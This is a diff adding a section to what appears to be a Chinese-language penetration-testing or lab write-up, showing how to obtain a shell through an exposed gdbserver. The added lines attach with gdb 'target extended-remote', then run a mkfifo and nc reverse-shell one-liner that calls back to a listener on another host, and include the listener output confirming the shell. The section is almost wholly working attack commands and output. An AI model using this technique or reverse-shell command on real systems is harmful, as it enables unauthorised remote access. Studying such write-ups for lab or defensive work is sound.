@@ -192,3 +192,27 @@ PID 3840: Error: Access Denied or File Unreadable
 
 ```
 利用gdb远程连接获取shell
+```
+(gdb)target extended-remote 192.168.0.107:38613
+#反弹
+(gdb) set remote exec-file /bin/ash)
+(gdb) run -c "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 |nc 172.18.100.74 4567 > /tmp/f"
+Starting program: target:/bin/busybox -c "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 |nc 172.18.100.74 4567 > /tmp/f"
+Reading /lib/ld-musl-x86_64.so.1 from remote target...
+Reading /lib/ld-musl-x86_64.so.1 from remote target...
+Reading /usr/lib/debug/lib/ld-musl-x86_64.so.1.debug from remote target...
+Reading /usr/lib/debug/lib/ld-musl-x86_64.so.1.debug from remote target...
+[Detaching after fork from child process 3608]
+[Detaching after fork from child process 3609]
+[Detaching after fork from child process 3610]
+[Detaching after fork from child process 3611]
+[Detaching after fork from child process 3612]
+
+─# nc -lvnp 4567          
+listening on [any] 4567 ...
+connect to [172.18.100.74] from (UNKNOWN) [172.18.105.157] 43103
+/bin/sh: can't access tty; job control turned off
+~ $ id
+uid=1000(514) gid=1000(514) groups=1000(514)
+
+```
